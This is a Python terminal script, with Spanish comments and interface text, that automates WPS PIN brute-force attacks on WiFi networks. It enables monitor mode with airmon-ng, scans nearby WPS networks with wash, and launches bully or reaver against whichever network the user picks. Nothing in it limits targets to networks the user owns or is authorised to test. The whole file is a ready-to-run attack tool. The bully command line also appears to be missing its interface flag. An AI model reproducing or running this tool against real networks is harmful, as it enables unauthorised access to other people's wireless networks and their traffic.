#!/usr/bin/env python3
import os
import subprocess
import curses
import time
from curses import wrapper

def run_command(cmd, timeout=None):
    try:
        result = subprocess.run(cmd, shell=True, check=True, 
                              stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                              text=True, timeout=timeout)
        return result.stdout
    except subprocess.CalledProcessError as e:
        return f"Error: {e.stderr}"
    except subprocess.TimeoutExpired:
        return "Timeout"

def enable_monitor_mode(stdscr):
    stdscr.clear()
    stdscr.addstr(0, 0, "Activando modo monitor...")
    stdscr.refresh()
    
    # Detener procesos que puedan interferir
    run_command("sudo airmon-ng check kill")
    
    result = run_command("sudo airmon-ng start wlan0")
    if "monitor mode enabled" in result.lower():
        return "wlan0mon"
    else:
        # Intentar determinar el nombre de la interfaz en modo monitor
        interfaces = run_command("iwconfig 2>/dev/null | grep 'Mode:Monitor' | awk '{print $1}'")
        if interfaces.strip():
            return interfaces.strip()
        else:
            stdscr.addstr(2, 0, "Error al activar modo monitor. Presiona cualquier tecla para salir.")
            stdscr.getch()
            exit(1)

def scan_networks(interface, stdscr):
    stdscr.clear()
    stdscr.addstr(0, 0, f"Escaneando redes con {interface} (Ctrl+C para detener)...")
    stdscr.refresh()
    
    try:
        # Eliminar archivo temporal si existe
        run_command("sudo rm -f /tmp/wash_scan.txt")
        
        # Comando para capturar la salida de wash
        cmd = f"sudo timeout 10 wash -i {interface} 2>&1 | tee /tmp/wash_scan.txt"
        
        # Ejecutar wash
        os.system(cmd)
        
        # Leer los resultados del archivo
        try:
            with open('/tmp/wash_scan.txt', 'r') as f:
                lines = f.readlines()
        except FileNotFoundError:
            stdscr.addstr(2, 0, "Error: No se pudo leer el archivo de resultados.")
            stdscr.refresh()
            time.sleep(2)
            return []
        
        # Filtrar líneas válidas de redes
        networks = []
        for line in lines:
            if "BSSID" in line or "----" in line or not line.strip():
                continue
            parts = line.split()
            if len(parts) >= 6:
                networks.append({
                    'bssid': parts[0],
                    'channel': parts[1],
                    'power': parts[3],
                    'essid': ' '.join(parts[5:])
                })
        
        return networks
        
    except Exception as e:
        stdscr.addstr(2, 0, f"Error al escanear: {str(e)}")
        stdscr.refresh()
        time.sleep(2)
        return []

def select_network(networks, stdscr):
    current_row = 0
    
    while True:
        stdscr.clear()
        stdscr.addstr(0, 0, "Selecciona una red WiFi (↑/↓ para mover, Enter para seleccionar, ESC para salir):")
        
        for idx, network in enumerate(networks):
            x = 0
            y = idx + 2
            if idx == current_row:
                stdscr.attron(curses.color_pair(1))
                stdscr.addstr(y, x, f"{idx+1}. {network['bssid']} - Ch: {network['channel']} - {network['essid']}")
                stdscr.attroff(curses.color_pair(1))
            else:
                stdscr.addstr(y, x, f"{idx+1}. {network['bssid']} - Ch: {network['channel']} - {network['essid']}")
        
        stdscr.refresh()
        
        key = stdscr.getch()
        
        if key == curses.KEY_UP and current_row > 0:
            current_row -= 1
        elif key == curses.KEY_DOWN and current_row < len(networks)-1:
            current_row += 1
        elif key == curses.KEY_ENTER or key in [10, 13]:
            return networks[current_row]
        elif key == 27:  # ESC
            return None

def select_tool(stdscr, network):
    current_row = 0
    options = ["Usar Bully", "Usar Reaver", "Volver"]
    
    while True:
        stdscr.clear()
        stdscr.addstr(0, 0, f"Red seleccionada: {network['essid']} ({network['bssid']})")
        stdscr.addstr(1, 0, "Selecciona una herramienta:")
        
        for idx, option in enumerate(options):
            x = 0
            y = idx + 3
            if idx == current_row:
                stdscr.attron(curses.color_pair(1))
                stdscr.addstr(y, x, f"> {option}")
                stdscr.attroff(curses.color_pair(1))
            else:
                stdscr.addstr(y, x, f"  {option}")
        
        stdscr.refresh()
        
        key = stdscr.getch()
        
        if key == curses.KEY_UP and current_row > 0:
            current_row -= 1
        elif key == curses.KEY_DOWN and current_row < len(options)-1:
            current_row += 1
        elif key == curses.KEY_ENTER or key in [10, 13]:
            if current_row == 0:  # Bully
                return "bully"
            elif current_row == 1:  # Reaver
                return "reaver"
            else:
                return None
        elif key == 27:  # ESC
            return None

def run_attack(tool, network, interface, stdscr):
    stdscr.clear()
    stdscr.addstr(0, 0, f"Ejecutando {tool} contra {network['essid']} ({network['bssid']})")
    stdscr.addstr(1, 0, "Presiona ESC en esta ventana para detener el ataque...")
    stdscr.refresh()
    
    # Crear una nueva ventana para la salida del comando
    output_win = curses.newwin(curses.LINES-3, curses.COLS, 3, 0)
    output_win.scrollok(True)
    
    if tool == "bully":
        cmd = f"sudo bully  {interface} -b {network['bssid']} -v 3"
    else:  # reaver
        cmd = f"sudo reaver -i {interface} -b {network['bssid']} -c {network['channel']} -vv"
    
    try:
        process = subprocess.Popen(cmd, shell=True, 
                                 stdout=subprocess.PIPE, 
                                 stderr=subprocess.STDOUT,
                                 text=True)
        
        while True:
            output = process.stdout.readline()
            if output == '' and process.poll() is not None:
                break
            if output:
                output_win.addstr(output)
                output_win.refresh()
            
            # Comprobar si el usuario quiere cancelar (ESC)
            stdscr.nodelay(True)
            key = stdscr.getch()
            stdscr.nodelay(False)
            if key == 27:  # ESC
                process.terminate()
                break
            
    except KeyboardInterrupt:
        process.terminate()
    
    output_win.addstr("\nAtaque completado o detenido. Presiona cualquier tecla para continuar...")
    output_win.refresh()
    output_win.getch()

def main(stdscr):
    # Configuración de colores
    curses.curs_set(0)
    curses.init_pair(1, curses.COLOR_BLACK, curses.COLOR_WHITE)
    
    # Activar modo monitor
    monitor_interface = enable_monitor_mode(stdscr)
    
    while True:
        # Escanear redes
        networks = scan_networks(monitor_interface, stdscr)
        
        if not networks:
            stdscr.clear()
            stdscr.addstr(0, 0, "No se encontraron redes WPS. Presiona:")
            stdscr.addstr(1, 0, "1. Para reintentar el escaneo")
            stdscr.addstr(2, 0, "ESC para salir")
            stdscr.refresh()
            
            key = stdscr.getch()
            if key == 27:
                break
            elif key == ord('1'):
                continue
            else:
                continue
        
        # Seleccionar red
        selected_network = select_network(networks, stdscr)
        if not selected_network:
            continue
        
        # Seleccionar herramienta
        tool = select_tool(stdscr, selected_network)
        if not tool:
            continue
        
        # Ejecutar ataque
        run_attack(tool, selected_network, monitor_interface, stdscr)

    # Al salir, desactivar modo monitor
    run_command(f"sudo airmon-ng stop {monitor_interface}")
    stdscr.clear()
    stdscr.addstr(0, 0, "Modo monitor desactivado. Saliendo...")
    stdscr.refresh()
    time.sleep(2)

if __name__ == "__main__":
    # Verificar si somos root
    if os.geteuid() != 0:
        print("Este script requiere privilegios de root. Ejecuta con sudo.")
        exit(1)
    
    # Verificar dependencias
    required = ['wash', 'bully', 'reaver', 'airmon-ng']
    missing = []
    for cmd in required:
        if not subprocess.run(f"which {cmd}", shell=True, stdout=subprocess.DEVNULL).returncode == 0:
            missing.append(cmd)
    
    if missing:
        print(f"Faltan las siguientes dependencias: {', '.join(missing)}")
        exit(1)
    
    # Ejecutar la aplicación
    wrapper(main)

